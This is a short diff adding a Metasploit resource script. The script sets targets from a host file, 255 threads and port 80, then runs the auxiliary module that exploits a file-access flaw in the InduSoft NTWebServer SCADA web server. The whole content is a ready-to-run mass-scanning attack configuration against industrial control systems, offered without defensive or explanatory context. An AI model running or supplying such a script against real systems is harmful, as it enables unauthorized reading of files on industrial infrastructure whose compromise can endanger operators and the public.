@@ -1,0 +1,6 @@
+setg RHOSTS file:
+setg THREADS 255
+setg RPORT 80
+
+use auxiliary/scanner/scada/indusoft_ntwebserver_fileaccess
+run
